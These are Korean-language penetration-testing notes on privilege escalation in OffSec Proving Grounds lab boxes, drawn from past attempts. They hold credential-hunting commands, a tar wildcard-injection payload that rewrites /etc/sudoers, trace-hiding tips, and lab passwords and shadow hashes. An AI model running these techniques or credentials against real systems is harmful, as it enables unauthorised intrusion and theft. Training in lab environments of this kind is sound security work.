**⚠️ `sudo -l` 규칙을 못 찾았어도 `id` 의 `groups=…,27(sudo)` 가 남아 있으면 그 경로는 살아 있음 — 분기는 「비밀번호 탐색」임.** 그 계정의 비밀번호를 얻는 순간 끝나므로, SUID·크론으로 넘어가기 전에 아래를 먼저 훑을 것([[RubyDome]]):
```bash
grep -rniE 'password|passwd|secret|token|api[_-]?key' /home/<user> /var/www 2>/dev/null
ls -la /home/<user>; cat ~/.bash_history 2>/dev/null
ps aux --forest      # root 로 도는 프로세스
ss -tlnp             # 외부에 안 열린 로컬 서비스
```

**Windows 7 · Server 2008 R2 구형 빌드의 후보 순서**(SYSTEM 이 아니었을 때):
1. `whoami /priv` → `SeImpersonatePrivilege` 가 있으면 **Potato 계열.** ⚠️ 구형(Win7 7600 등)에서는 **JuicyPotato 가 아직 동작함** — build 17763 이상에서 죽은 것과 대비됨(B-46)
2. **커널 익스플로잇** — 7600 은 SP1 도 안 올라간 RTM 이라 MS10-015(KiTrap0D)·MS10-092·MS11-046 등이 그대로 삶. `systeminfo` → Windows Exploit Suggester. ⚠️ 커널 익스플로잇은 한 발임(B-24)
3. `sc query` · `accesschk` → 서비스 바이너리 경로 권한·**언쿼티드 서비스 경로**(B-44)
4. `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` → 1 이면 msi 페이로드(B-41)
5. `C:\Users\*\` 아래 설정 파일·`Unattend.xml`·`sysprep.inf` 의 평문 자격증명(B-64)

**빌드 번호가 곧 후보 목록임** — `smb-os-discovery` 가 `7600`(SP 미적용)을 주면 2010년 이후 패치가 하나도 없다는 뜻이고, **설치된 서드파티 앱도 같은 시기에 멈춰 있을 가능성이 매우 높음.**


**`www-data` 같은 서비스 계정으로 떨어졌으면 SUID·크론보다 «자격증명 사냥»이 먼저임** — 싸고 안정적이고 흔적이 적음. 체크리스트:
```bash
cat ~/.bash_history                      # HOME 미설정이면 /home/*/.bash_history
ls -la /var/www/html/                    # config.php · .env · wp-config.php
grep -rn "password\|passwd\|secret" /var/www/ 2>/dev/null | head
ls -la /var/spool/mail/ /var/mail/       # ★ 로컬 메일함 — 자주 잊힘
ls -la ~/mbox ~/Maildir/                 # ★
ls -la /opt /srv /backup
find / -name "*.bak" -o -name "*.old" 2>/dev/null | head
```
★ 두 줄이 [[plum]] 의 정답이었음 — `/var/spool/mail/www-data` 는 **소유자가 `www-data`** 라 셸 계정이 그대로 읽었고, 본문에 `root:6s8kaZZNaZZYBMfh2YEW` 가 평문으로 있었음. 셸 획득(13:00:31)부터 확인(14:28:56)까지 **88분**이 걸림.
**메일함을 볼 신호는 정찰에서 이미 나옴** — ⑴ 앱 진단 페이지의 `Mail sending function available` ⑵ `netstat`/`ss` 의 `127.0.0.1:25`(루프백 MTA, 외부 nmap 에 안 잡힘). 둘 중 하나라도 보이면 메일함이 존재함.
**리눅스 권한상승 열거 순서 — ②가 ⑥보다 앞임:**
```text
① id · sudo -l                    ← 가장 싸고 가장 자주 정답
② 자격증명 사냥                    ← 설정파일 · 히스토리 · 백업 · ★메일함
③ netstat/ss -lntup               ← 루프백 서비스 (외부 스캔에 안 잡힘)
④ find / -perm -4000 · getcap -r /
⑤ crontab · /etc/cron.*
⑥ 커널/서비스 CVE                  ← ★ 반드시 버전 확인 후에 (A-13)
```
**`sudo -l` 은 한 번 실패하면 접을 것.** 비밀번호를 모르면 정보를 못 주고(`NOPASSWD` 항목이 없으면 목록조차 안 나옴) 실패 로그만 남음. [[plum]] 은 15분 간격으로 **두 번** 시도해 둘 다 실패했고 그 로그가 메일함에 쌓였음.
⛔ **「`sudo` 실패는 기본적으로 root 에게 메일을 보낸다」는 틀림.** `sudoers(5)` 실측:
```text
mail_badpass    Send mail to the mailto user if the user running sudo
                does not enter the correct password.  …  This flag is off
                by default.

mail_no_user    If set, mail will be sent to the mailto user if the
                invoking user is not in the sudoers file.  This flag
                is on by default.
```
기본 ON 은 `mail_no_user` 뿐이고 **`mail_badpass` 는 기본 OFF** 임. [[plum]] 에서 관측된 문구는 정확히 `1 incorrect password attempt` = `mail_badpass` 템플릿이므로 **그 박스가 특별히 켜둔 것**임. → **「메일이 안 왔으니 안 들켰다」로 읽지 말 것** — 같은 man 페이지가 *"By default, all attempts to run sudo (successful or not) are logged, regardless of whether or not mail is sent."* 라고 못 박음.


[[Flu]] — 같은 익스플로잇 파일(EDB 51904)을 **버렸다가 다시 가져왔음.** 시점을 보면 이유가 보임:
```text
rm 51904.py                 ← 초반, through_the_wire 클론 직전
...
mv 51904.py ./PG/Flu        ← 후반, 셸을 잡은 뒤
```
— 출처: `~/.zsh_history`
후반의 재시도는 `--read-file /root/proof.txt` 가 실패한 다음임. 즉 **「권한상승 수단」으로 웹 익스플로잇을 하나 더 찾은 것.**
**이미 `confluence` 로 RCE 를 갖고 있었으므로 같은 웹앱에 두 번째 웹 익스플로잇을 거는 것은 «같은 권한을 다시 얻는 일»임.** 성공해도 여전히 `confluence` 임.
필요했던 것은 로컬 권한상승 열거였음. `~/.zsh_history` 에 `cd linpeas` 가 한 줄 있는 것으로 보아 linpeas 를 떠올리기는 했으나 **타겟에 올려 돌린 흔적은 없음**(관측 없음).
→ **셸을 잡은 뒤에 웹 익스플로잇을 더 찾고 있으면 방향을 잘못 잡은 것임.** 셸이 있으면 무기는 웹이 아니라 `id`·`sudo -l`·`find -perm -4000` 임.
⚠️ 부가 — 같은 히스토리에 `vi 51904.py -u http://192.168.103.41:8090 -c whoami` 가 있음. **`python` 을 칠 자리에 `vi` 를 친 것**이고, vi 가 `-u`(vimrc 지정)·`-c`(명령 실행)를 자기 플래그로 삼켜 엉뚱한 편집 세션이 열림. 다음 줄이 그냥 `vi 51904.py` 인 것을 보면 바로 알아채고 나온 듯함.

**질문을 바꾸는 것이 2라운드다.** [[Flu]] — `id`(그룹 없음) · `sudo -l`(비밀번호 요구) · SUID(전부 배포판 기본, `pkexec` 도 없음) · `getcap`(전부 기본) · 크론(`/etc/cron*` 기본, 개인 crontab 없음). **다섯이 연달아 빈손이었음.**
여기서 하기 쉬운 선택 둘이 다 나쁨 — ⓐ 커널 익스플로잇으로 도망(버전 추정이 틀리면 시간만 태움, 그리고 PG 박스가 커널 0-day 를 요구하는 경우는 드묾) ⓑ 같은 열거를 도구만 바꿔 반복(linpeas 를 올림 — 나쁘진 않으나 이 박스는 **손으로 친 `find / -writable` 한 줄이 답**이었고 도구를 올리는 시간이 더 길었을 것임).

| 1라운드 질문 | 2라운드 질문 |
|---|---|
| 나는 무엇을 실행할 수 있나 (`sudo -l`·SUID·capabilities) | 나는 무엇을 쓸 수 있나 (`find / -writable`) |
| 나는 어느 그룹인가 (`id`) | 누가 내 것을 실행하나 (root cron·systemd·서비스 유닛) |
| 어떤 크론이 보이나 (`/etc/cron*`) | 크론이 안 보이는데도 도는 증거가 있나 (`pspy`, 남의 홈에 쓰는 내 소유 스크립트, mtime 이 방금인 파일) |

Flu 는 2라운드 **첫 줄**에서 끝났음. **1라운드가 다섯 번 빈손이면 그건 실패가 아니라 신호임.**
⚠️ 그리고 도구를 하나도 올리지 않은 것이 2차 세션 권한상승이 **5분**에 끝난 이유임.

**경로 위의 모든 디렉터리에 `x` 권한이 있어야 파일에 닿음.**
[[Flu]] 의 `/root/proof.txt` 는 **`-rw-r--r--`(0644)** 였는데도 저권한에서 못 읽었음. 막은 것은 파일이 아니라 **`/root` 의 `drwx------`** 임:
```text
ls: cannot open directory '/root': Permission denied
```
— 출처: `~/PG/Flu/privesc_session.log`
「`/root/*` 는 통상 `0600` 이라 못 읽는다」는 설명은 이 박스에서 **틀렸음.** 결론은 같아도 이유가 다르고, 그 차이 때문에 **파일 모드만 보고 「읽을 수 있겠네」로 판단하면 안 됨.**

#### A-42. `find` / `ls` 가 영영 안 끝난다

**느린 게 아니라 «안 끝나면» NFS 죽은 마운트를 의심할 것.** `hard` 옵션 마운트는 서버가 죽어도 무한 재시도하므로 **그 경로를 stat 하는 모든 순회가 영구 블록됨.**

- **진단**: `grep nfs /proc/mounts` — `mount` 나 `df` 는 그 자체가 걸릴 수 있음
- **회피**: `ls -f /tmp` 는 stat 을 안 해 즉시 반환. `find` 는 `-maxdepth` · `-newermt` 로 좁힐 것
- **해제는 총괄 몫** — `sudo umount -f -l <경로>`. 다른 세션 사용 여부 확인이 필요하므로 에이전트가 직접 하지 말 것

실측(2026-08-20): 지난 세션이 남긴 `192.168.248.222:/mnt/share → /tmp/nfs` 하나가 Nagoya·Jacko·Hutch 감사자의 백그라운드 작업을 전부 죽였고, 원인이 자기 명령에 있는 줄 알고 헤맴.

**일반화** — 박스 작업 중 만든 마운트는 작업이 끝나면 반드시 풀 것.

#### A-43. `sudo -l` 이 좁아도 대상 파일 권한을 확인한다

**내가 쓸 수 있으면 사실상 `NOPASSWD: ALL`임.** ([[RubyDome]])

**스크립트를 가리키면 본문만 읽고 끝내지 말 것 — `require`/`import` 한 라이브러리의 «버전»까지 볼 것.** 스크립트 본문이 깨끗해도 gem/pip/npm 패키지가 뚫려 있으면 끝임.
[[Fikklish]] — root 소유 `fetch.rb`·`checkout.rb` 자체는 평범한 8~10줄짜리였으나 **`gem list git` 한 줄**로 `ruby-git 1.10.2`(CVE-2022-25648 대상)임이 확인되어 권한상승이 성립했음. **`gem list` · `pip list` · `npm ls` 를 습관으로 둘 것**(인자 주입 경로는 B-1-16).

**인자까지 «고정»된 규칙에서는 GTFOBins 가 안 통함 — 그때 공격면은 바이너리가 아니라 그 바이너리가 «읽는 데이터»임.**

| sudoers 규칙 | 가능한 것 |
|---|---|
| `(ALL) /usr/bin/ruby`(인자 없음) | 아무 인자나 → GTFOBins 즉시 적용 |
| `(ALL) /usr/bin/ruby /path/x.rb` | 그 명령 그대로만 → **파일 내용·라이브러리를 공략** |
| `(ALL) /usr/bin/ruby /path/*` | 와일드카드 → `/path/../../tmp/evil.rb` 경로 트래버설(B-38 · B-39) |
| `(ALL) /usr/bin/ruby /path/x.rb *` | 뒤에 인자 추가 가능 → `-e` 주입 여지 |

[[RubyDome]] 은 두 번째 줄이었음 — `ruby` 를 보고 `sudo ruby -e 'exec "/bin/sh"'` 를 반사적으로 치면 **거부됨.** 여기서 「sudo 는 막혔다」고 결론 내리면 박스가 통째로 막힘. **다음 수는 GTFOBins 가 아니라 `ls -la <대상파일>` 임.**

`sudo -l` 에 파일 경로가 보이면 반사적으로 셋:
```bash
ls -la <그 경로>
ls -ld $(dirname <그 경로>)
grep -nE 'require|source|load|import' <그 경로>
```
**디렉터리 쓰기 권한만 있어도 충분함** — 원본을 `mv` 하고 같은 이름의 새 파일을 놓으면 됨. 단 `mv` 는 inode 를 바꿔 소유자가 교체되므로 흔적이 남음(조용히 가려면 `cp`·리다이렉션, C-5).
`env_reset` + `secure_path` 가 붙어 있으면 `PATH`·`RUBYLIB` 환경변수 조작 경로는 막힌 것임. `use_pty` 는 익스플로잇에 영향 없음.

#### A-44. 셸을 잡으면 `netstat -tulpn` 도 친다

**내부에서 보이는 포트가 외부 nmap 보다 넓음.** `127.0.0.1:*` 줄은 전부 「아직 안 본 공격면」임.

([[Clue]] — 밖에서 6개, 안에서 11개. 필터링된 `0.0.0.0:1337` 과 루프백 JMX 가 거기 있었음) · ([[Squid]] — 프록시 경유 내부 포트 열거가 같은 계열)


**웹 계정 셸을 잡으면 `HOME`·`PATH`·`TERM` 부터 세울 것.** Apache 가 띄운 자식 프로세스는 환경을 거의 물려받지 않음 — [[plum]] 은 인자 없는 `cd` 가 `bash: cd: HOME not set` 으로 실패했음.
```bash
export HOME=/tmp; export TERM=xterm; export PATH=$PATH:/usr/sbin:/sbin
```
⚠️ **`/usr/sbin:/sbin` 을 빼면 `netstat`·`ss`·`iptables` 가 「command not found」로 보임** — 도구가 없는 게 아니라 경로가 없는 것임(Windows 판은 A-3-11).
**루프백 전용 서비스는 외부 스캔에 원리적으로 안 잡힘.** [[plum]] 은 외부 nmap 이 22/80 만 봤는데 셸 안에서는 `127.0.0.1:25` 가 있었음:
```text
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
```
25 가 보이면 ⑴ 로컬 MTA 가동 ⑵ **메일함이 존재**함이 함께 확정됨 → `/var/spool/mail/` 로 직행(A-41). [[plum]] 은 그것이 정답이었음.

#### A-45. 크론이 안 보인다 / `find` 가 정답을 잘랐다

**`/etc/crontab`·`/etc/cron.d`·`/etc/cron.*` 가 전부 스톡이면 「크론 없음」이 아니라 「내 권한으로 안 보임」임.** root 개인 crontab 은 `/var/spool/cron/crontabs/root`(모드 `drwx-wx--T root:crontab`)에 있어 **비특권 사용자가 읽을 수 없음.** 도구 결함이 아니라 구조적 한계라 `harvest.sh`·LinPEAS 어느 쪽으로도 안 나옴([[Assignment]]).

**우회는 둘** — ⓐ **주기적 프로세스 관측** ⓑ **쓰기 가능 경로에서 역추적**(`find / -perm -0002 -type d` 로 나오는 디렉터리가 청소 크론의 표적일 확률이 높음. [[Assignment]] 은 `/dev/shm` 이었음).

⛔ **`head` 는 노이즈를 줄이는 도구지 결론을 내리는 도구가 아님.** [[Assignment]] 은 셸 잡은 직후 이미 정답을 찾을 명령을 돌렸으나 잘라서 놓쳤음(**약 10분 손실**):
```text
find / -name "*clean*" -not -path "/proc/*" -not -path "/sys/*" -not -path "/snap/*" \
  -not -path "/usr/share/*" -not -path "/usr/lib/*" 2>/dev/null | head -20
```
출력 20줄이 전부 `/var/www/rails-app/node_modules/...` 의 `clean.js`·`cleanupAttrs.js` 로 찼고 **`/usr/bin/clean-tmp.sh` 는 21번째 이후에 있었음.** 「없다」고 결론내고 프로세스 관측으로 방향을 틀었음.
→ 노이즈 경로(`node_modules`·`rvm`·`linux-headers`)를 `-not -path` 로 **빼고 전량을 볼 것.** 결과가 많으면 파일로 받아 grep 할 것.

**pspy 가 안 돌면 `/proc` 폴러를 직접 짤 것.** [[Assignment]]: Kali 의 `/usr/share/pspy/pspy64`·`pspy64s` 둘 다 실패 —
```text
/tmp/.p: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/.p)
```
타겟은 Ubuntu 20.04(glibc 2.31), Kali 패키지는 최신 glibc 로 빌드됨. **`pspy64s`(정적판)도 같은 실패 — 이름과 달리 완전 정적이 아님.**
대체품은 처음엔 `sh` + 본 PID 목록을 **파일에 grep** 하는 방식이었는데 너무 느려 초당 몇 회전밖에 못 돌아 짧은 크론 프로세스를 놓칠 수 있었음. bash 연관배열로 바꾸니 3초에 1000행 — **이것이 실용 하한**:
```bash
declare -A seen
while ...; do
  for p in /proc/[0-9]*; do
    pid=${p#/proc/}; [[ -n ${seen[$pid]} ]] && continue; seen[$pid]=1
    cmd=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null); [[ -z $cmd ]] && continue
    uid=$(awk '/^Uid:/{print $2; exit}' "$p/status")
    echo "$(date +%T) uid=$uid pid=$pid :: $cmd"
  done
done
```

**설정 파일의 「꺼져 있다」를 근거로 벡터를 배제하지 말 것.** [[Assignment]] 의 Gogs `app.ini`:
```ini
[service]
...
ENABLE_GIT_HOOKS = false
```
값만 보면 훅이 막혀 있으나 **실제로는 그대로 동작했음**(훅으로 셸을 땄음).

⚠️ **원인은 「섹션 배치 오류」가 아님 — 소스로 반증됨.** Gogs 0.12.9 에 **`ENABLE_GIT_HOOKS` 라는 키 자체가 존재하지 않음.** 훅 편집 게이트는 설정을 전혀 보지 않고 `CanEditGitHook() = u.IsAdmin || u.AllowGitHook` 뿐임(v0.12.9 태그 직접 조회 — `internal/db/user.go:174-177` · `internal/context/repo.go:455-462` · `internal/cmd/web.go:448-452`).
→ 일반화하면 더 강한 교훈임: **설정 파일에 있는 키가 그 소프트웨어가 «읽는» 키라는 보장이 없음.** 오래된 예제 `app.ini` 를 복사해 쓰다 남은 죽은 키일 수 있음. **한 번 때려보는 비용이 훨씬 쌈.**


**볼 수 있는 것과 볼 수 없는 것을 갈라 적을 것.**
- 볼 수 있음 — `/etc/crontab` · `/etc/cron.d/*` · `/etc/cron.{hourly,daily,weekly,monthly}/*` · 자기 자신의 `crontab -l`
- **볼 수 없음** — **다른 사용자의 개인 crontab 전부**, systemd 타이머의 일부 유닛 내용

그래서 「크론 없음」은 **결론이 아니라 관측 한계**임. 간접 증거로 넘어갈 것:
- `ls -la --time-style=full-iso` 로 **mtime 이 방금인 파일** — 뭔가 주기적으로 돈다는 뜻
- `pspy` 로 프로세스 생성 감시(root 권한 없이도 `/proc` 폴링으로 잡음)
- **남의 디렉터리에 쓰는데 «내가 소유한» 스크립트** ← [[Flu]] 의 답
- `/var/log/syslog` 의 `CRON[...]` 줄(읽을 수 있다면)

[[Flu]] 실측 — `/etc/crontab`·`/etc/cron.d/`·`/etc/cron.hourly/` 가 전부 배포판 기본이고 `crontab -l` 은 `no crontab for confluence`. **게다가 `systemctl list-timers --all`(15개 전부 배포판 기본)과 `grep -rl "log-backup" /etc/systemd /usr/lib/systemd /etc/cron*`(빈 결과)까지 소거했는데도 빈손이었음.** 실제로는 root 개인 crontab 에 `*/1 * * * * /opt/log-backup.sh` 가 있었음.
→ **트리거를 못 찾았다는 것 자체가 「내 권한으로 안 보이는 곳에 있다」는 확정 정보임.** 소거를 다 했으면 다음은 간접 증거로 갈 것.
→ 그리고 **스크립트 안의 정리 조건이 주기를 알려줌** — `find $BACKUP_DIR -name "log_backup_*" -mmin +5 -exec rm -rf {} \;` 의 `-mmin +5` 는 「5분보다 오래된 것을 지운다」이므로 **분 단위로 도는 작업**이라는 뜻임. 실제 주기는 1분이었고 페이로드는 48초 만에 발동함.

#### A-46. 다단계 익스플로잇은 각 단계를 «따로» 검증한다

**증상** — 트리거+인젝션처럼 두 단계 이상인 PoC 가 실패하면 「안 된다」로 뭉뚱그려 원인을 못 좁힘.

[[Internal]] — MS09-050 PoC 는 injection(악성 SMB2 negotiate) + trigger(rpcclient 인증 시도) 두 단계. 재시도 국면에서 **트리거가 injection 과 무관한 이유로 따로 고장나 있었음** — Samba 클라이언트가 SMBv1 negotiate 에 SMB2 방언(`SMB 2.002`)을 함께 광고해, `srv2.sys` 가 죽은 서버가 응답 불능(`NT_STATUS_IO_TIMEOUT`).

첫 가설(「`client min protocol` 기본값이 SMB2」)은 `testparm -sv`(`LANMAN1`)로 **반증**됨 — 진짜 원인은 `min` 이 아니라 클라이언트가 보내는 **`max` 방언 광고**였음. `client max protocol=NT1` 로 SMB2 방언 광고를 끄자 트리거만 먼저 복구(`session setup failed: NT_STATUS_LOGON_FAILURE` = 정상 인증 거부).

**트리거를 고치기 전에는 「injection 이 안 된다」고 말할 근거조차 없었음** — 고친 뒤에도 콜백 0건이어서야 진짜 공격면 소멸을 확정할 수 있었음.

**교훈** — 도구 A(nmap)는 되고 도구 B(rpcclient)는 안 되면 「서버가 죽었다」가 아니라 **「요청이 다르다」를 먼저 의심**할 것. 클라이언트별 negotiate 내용(방언 광고 여부)을 맞춰볼 것.

#### A-47. 권한상승 도구가 «내» 계정 비밀번호까지 갈아치운다

**증상** — sudo 로 돌린 커스텀 도구가 대상 계정의 shadow 행을 **통째로 다시 씀.** 부작용으로 지금 쓰고 있는 계정의 비밀번호가 바뀌어 **재로그인이 막힘.**

[[Graph]] 실측 — `sudo pass-gen` 실행 전후 jane 행 대조:
```text
jane:$6$41234567$UopOgp8jETVNueXnCycGNoUfGyjLiG6sWjY2KqtbmrUicBcxFivIfOrymqt1cxt3FGLLYEw35wv1I.f76oBLA1:19831:0:1337:7:::   ← 복원본(원본)
jane:$6$32320834$CYv6J3o8vCo9wN3IiCSkZeQ68JujU3hiJpO3yz6xHuyuzdrbCCwomlgEVqVzFaUPnlqSLUelPKzSGIKlnD7q7.:19831:0:99999:7:::   ← 익스플로잇 후
```
— 출처: `~/PG/Graph/cleanup_evidence_box.txt` · `~/PG/Graph/harvest_root.txt` 「USERS」절

해시가 salt 째 재생성됐음. `[가정]` **크랙한 `oakland` 이 더는 jane 의 비밀번호가 아니라는 것은 추론임** — 새 해시의 평문을 다시 크랙해 확인한 적이 없음(관측된 것은 「해시가 바뀌었다」까지). 어느 쪽이든 **이 시점에 셸이 끊기면 재진입 경로가 사라질 위험**이 실재함.

**대응** — 이런 도구를 돌리기 **전에** ① 살아 있는 셸을 하나 더 확보하거나 ② `~/.ssh/authorized_keys` 에 공개키를 먼저 심을 것. 그리고 **`/etc/shadow` 백업을 먼저 뜰 것** — [[Graph]] 는 `/tmp/s.restore` 로 떠 놨고 그것이 복원과 원본 대조의 유일한 근거가 됨.

#### A-48. RDP 로 붙었는데 트레이 아이콘이 없다 — 세션 토폴로지부터 잰다

**증상** — GUI 조작이 필요한 권한상승인데, RDP 로 붙은 화면의 알림 영역에 대상 앱 아이콘이 없음. 오버플로우 영역도 비어 있고 Alt-Tab 에도 창이 없음.

**먼저 잴 것 — `query session` / `query user`.**
```text
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
 services                                    0  Disc                        
>rdp-tcp#16        divine                    1  Active                      
 console                                     3  Conn                        
 rdp-tcp                                 65536  Listen                      
---
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>divine                rdp-tcp#16          1  Active          1  7/16/2026 4:24 PM
```
— 출처: `~/PG/Mice/shell443.log:7803-7811`

**읽는 법** — 로그온 시각이 내 접속 시각보다 훨씬 앞이면(여기서는 7/16), 내가 만든 세션이 아니라 **원래 콘솔에 자동 로그인돼 있던 세션에 RDP 가 재접속(reconnect)해 들어간 것**임. 증거는 `SESSIONNAME` 이 `console` 에서 `rdp-tcp#N` 으로 바뀐 것이고, 남은 `console`(ID 3)은 사용자 없이 `Conn` 으로 비어 있음.

**그러므로 세션이 갈려서 안 보이는 것이 아님.** [[Mice]] 에서 `RemoteMouse.exe`(PID 2640)·`RemoteMouseCore.exe`(PID 2632)도 **같은 세션 1** 에 있었음 — 같은 세션인데 알림 영역이 아이콘을 다시 그려주지 않은 것.
`[가정]` 세션을 콘솔에서 RDP 로 리다이렉트할 때 이미 등록돼 있던(그것도 상위 무결성으로 도는) 프로세스의 트레이 아이콘이 재생성되지 않는 경우가 있음 — **이 렌더링 실패의 정확한 메커니즘은 확인하지 못했음.**

**직접 띄우는 우회로도 막힐 수 있음** — 대상 exe 가 `requireAdministrator` 매니페스트면 일반 사용자가 실행할 때 UAC 가 관리자 암호를 요구함(A-49).

**해결 — 리부트로 세션 재생성.** `shutdown /r`. 자동 로그인이 있으면 부팅 후 콘솔 세션이 새로 생기고 서비스가 GUI 를 새로 띄우며, 그 시점에 RDP 로 붙으면 아이콘이 처음부터 그려진 세션을 받음. `whoami /priv` 에 `SeShutdownPrivilege` 가 `Disabled` 로 보여도 됨 — **`Disabled` 는 「없다」가 아니라 「아직 활성화 안 됐다」**이고 `shutdown` 이 알아서 활성화함. 검증은 키입력 주입으로 함(주입한 `TESTREBOOT` 가 RDP 화면의 Edge 주소창 `bing.com/search?q=TESTREBOOT` 에 그대로 나타났고 트레이에 아이콘도 있었음).

⛔ **함부로 `logoff` 하지 말 것.** [[Mice]] 는 아이콘 재생성을 노리고 `logoff` 를 먼저 썼고 **그 대가로 nc 리버스셸을 같이 잃었음.** 세션을 끊는 조치는 그 세션 위에 얹힌 셸을 전부 죽임. 리부트도 같은 대가를 치르므로 **하기 전에 플래그·산출물을 먼저 회수**할 것(A-49 · C-3).

#### A-49. 헤드리스에서 `The operation was canceled by the user` — 내가 취소한 게 아니다

**증상** — 헤드리스(SSH·리버스셸)에서 `Start-Process` 로 exe 를 띄우면:
```powershell
PS C:\WINDOWS\system32> Start-Process : This command cannot be run due to the 
error: The operation was canceled by the user.
```
— 출처: `~/PG/Mice/shell443.log:7813-7823`

**읽는 법** — 사용자가 취소한 것이 아니라 **응답할 대상이 없는 UAC 프롬프트가 자동으로 거절된 것**임. 대상 exe 가 `requireAdministrator` 매니페스트라는 신호. 이 문구를 「내 명령이 틀렸다」로 읽으면 시간을 태움.

**다음 수** — GUI 세션(RDP·VNC)을 확보하거나(A-48), UAC 를 우회하는 별도 경로를 찾을 것.

#### A-4-10. 디스크에 남은 PowerShell transcript 가 관리자 스크립트를 가리킨다

**증상** — 열거 중 이런 transcript 헤더가 나옴:
```powershell
Windows PowerShell transcript start
Start time: 20260820061010
Username: REMOTE-PC\Administrator
RunAs User: REMOTE-PC\Administrator
Configuration Name: 
Machine: REMOTE-PC (Microsoft Windows NT 10.0.19042.0)
Host Application: C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass -WindowStyle Hidden -NoProfile -Command C:\freezeScript\win10.ps1
```
— 출처: `~/PG/Mice/shell443.log:288-294`

**Administrator 가, `-ExecutionPolicy bypass` 로, 이 인스턴스가 켜진 날 06:10:10 에** 돌린 것. 여기까지만 보면 완벽한 하이재킹 대상.

**그러나 두 가지를 먼저 잴 것** — ① 스크립트 파일이 아직 있는가 ② 재실행 트리거가 사용자 손이 닿는 곳에 있는가.
[[Mice]] 는 `dir C:\freezeScript` 가 `File Not Found` — 스크립트가 자기 자신을 지우고 끝난 뒤였음(`shell443.log:380-401`). 트리거도 없었음(HKCU Run 은 OneDrive 뿐, 비-MS 예약작업도 OneDrive 뿐). **프로비저닝 잔재이고 재실행 지점이 없으므로 배제.**

→ 일반화: PG/HTB 박스의 `freezeScript`·`sysprep`·이미징 잔재는 「관리자가 돌린 흔적」일 뿐 벡터가 아닌 경우가 많음. **파일 존재 + 트리거 존재가 둘 다 성립해야 벡터임.**

#### A-4-11. 권한상승 페이로드에 «다른 박스»의 사용자명·`>` 덮어쓰기가 섞여 들어온다

**증상** — GTFOBins 류 페이로드를 준비하다 ⓐ `kali`(공격 머신 사용자명)처럼 **타겟에 없는 계정명**이 그대로 남거나 ⓑ `/etc/sudoers`·`/etc/passwd` 를 **`>` 로 통째로 덮어쓰는** 형태가 됨. 원인은 다른 박스에서 쓴 페이로드를 복사해 오며 안 고친 것.

[[Cockpit]] 실측(1차 페이로드, 폐기됨):
```text
james@blaze:~$ echo "" > '--checkpoint=1'
james@blaze:~$ ls
'--checkpoint=1'   local.txt
james@blaze:~$ echo "" > '--checkpoint-action=exec=sh privesc.sh'
james@blaze:~$ vi privesc.sh
james@blaze:~$ cat privesc.sh
echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers
```
— 출처: `파일보관\Pasted image 20260626133613.png`(13:36, Cockpit 웹 터미널 캡처)

두 가지가 동시에 틀렸음:
- **`kali` 는 이 호스트에 없는 계정임.** 실행돼도 james 가 얻는 것이 없음
- **`>` 로 `/etc/sudoers` 를 덮어쓰면 `james … NOPASSWD: /usr/bin/tar …` 규칙이 사라짐** — 즉 **유일한 권한상승 통로를 자기 손으로 닫는** 페이로드임. 리버트 말고는 복구가 없음

`[가정]` 이 페이로드가 실제로 실행됐는지는 화면에 없으나, **16분 뒤(13:52) `sudo tar` 가 정상 동작해 root 를 잡았으므로 `/etc/sudoers` 는 그 시점에 온전했음** — 실행 전에 갈아엎은 것으로 추정됨.

**대응 원칙 — 되돌릴 수 있는 페이로드부터.** `chmod +s /bin/bash` · 바이너리 복사 후 SUID · 리버스셸은 **기존 설정을 건드리지 않음.** 시스템 파일을 꼭 고쳐야 하면 **`>>` 로 추가**하고 원본을 먼저 백업할 것(A-47 의 shadow 백업과 같은 규율). **페이로드 안 사용자명은 실행 직전에 타겟 기준으로 다시 확인할 것.**

`[가정]` 1차는 홈 디렉터리(`~`)에서, 성공한 2차는 `/tmp` 에서 준비했음. sudo 규칙의 `*` 는 셸의 현재 디렉터리에서 확장되므로 `~` 에서도 원리상 통함 — **옮긴 이유는 기록에 없음.**

**⛔ 시험에서 Administrator 비밀번호를 바꾸지 말 것 — 근거는 「다른 응시자 방해」가 아님.** 되돌릴 수 없는 변조이고, **수습 수단이 revert(= 그 머신의 진척 전부 소실)뿐**인 것이 진짜 리스크임. 대안 순서: ① `LocalAccountTokenFilterPolicy` 토글(`/d 0` 으로 원복 가능, A-4-15) → ② SAM/SYSTEM 덤프 후 pass-the-hash(**아무것도 안 바꿈**). 둘 다 목적은 대화형 셸 확보임.
⚠️ 같은 이유로 SQL `UPDATE` 로 비밀번호 해시를 덮어쓰기 «전»에 원본을 먼저 읽을 것(B-12).


**같은 잔류가 «AD 열거 명령»에도 남는다 — 도메인·IP·TLD.** [[Heist]] 한 세션에서만 세 종류가 났음:

| 잔류 | 실제 | 어디서 왔나 |
|---|---|---|
| `impacket-GetUserSPNs nagoya-industries.com/enox:california` | `heist.offsec` | 바로 앞에 푼 [[Nagoya]] 의 도메인. 히스토리를 위로 올려 재사용하며 도메인만 안 고침 |
| `gMSADumper.py … -d heist.local` | `heist.offsec` | 「AD 랩은 `.local`」이라는 습관. nmap 이 `Domain: heist.offsec`·`DNS_Tree_Name: heist.offsec` 으로 **두 번** 말해줬는데도 |
| `nxc-sweep 192.168.120.172 -u 'enox' -p 'california'` | 192.168.120.165 | 같은 세션에 병행하던 [[Vault]] 의 IP |

→ **도메인 이름은 추측하지 말고 `nmap.log` 에서 복사해 붙일 것.** PG/OffSec 랩은 `.offsec`·`.com`·`.local` 이 뒤섞여 있음.
→ **방어책: 박스마다 디렉터리를 새로 만들고(`mkdir Heist; cd Heist`) 첫 명령으로 `nnmap` 을 칠 것.** 그러면 `nmap.log` 가 그 디렉터리의 정답 IP·도메인이 되고 히스토리 재사용 시 대조할 기준이 생김.
→ ⚠️ **다만 「자격증명을 옆 호스트에 던지는 반사」 자체는 옳다.** 시험 AD 세트는 같은 도메인의 여러 호스트로 구성되고 거기서는 그 스윕이 피벗의 전부임. 판단 기준은 하나 — **같은 도메인인가.** nmap 의 `DNS_Domain_Name` 을 비교하면 3초에 앎.

